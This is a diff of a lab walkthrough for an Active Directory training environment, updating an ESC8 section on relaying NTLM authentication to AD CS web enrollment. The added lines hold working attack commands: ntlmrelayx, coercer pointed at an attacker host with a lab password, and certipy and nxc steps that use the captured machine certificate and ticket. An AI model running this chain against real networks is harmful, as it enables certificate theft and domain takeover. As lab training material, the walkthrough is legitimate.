@@ -52,17 +52,25 @@ nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
 
 ## 01 - ESC8 (ADCS Web Enrollment)
 
-**Target:** dc01 | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any user.
+**Target:** dc01 (CA) + srv02 (coerce target) | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any machine account.
 
 ```bash
 # Check if web enrollment is available (HTTP, not HTTPS!)
-curl http://192.168.100.10/certsrv/
+curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: HTTP auth required (vulnerable)"
 
-# Relay NTLM auth to the HTTP web enrollment endpoint (coerce auth first)
-ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Terminal 1: Start ntlmrelayx targeting ADCS web enrollment
+ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template Machine
 
-# Use the obtained certificate to authenticate
-certipy auth -pfx dc01.pfx -dc-ip 192.168.100.10
+# Terminal 2: Coerce srv02 to authenticate to your relay (use your Kali IP)
+coercer coerce -d breakingbad.local -u walter.white -p "774azeG!" -t 192.168.100.21 -l <KALI_IP> --always-continue
+
+# After relay succeeds, you get SRV02$.pfx - authenticate with it
+certipy auth -pfx SRV02\$.pfx -dc-ip 192.168.100.10
+
+# Use the machine hash for Silver Ticket or S4U2Self attacks
+# Or with the ccache for Kerberos auth:
+export KRB5CCNAME=srv02.ccache
+nxc smb 192.168.100.21 -k --use-kcache
 ```
 
 ---
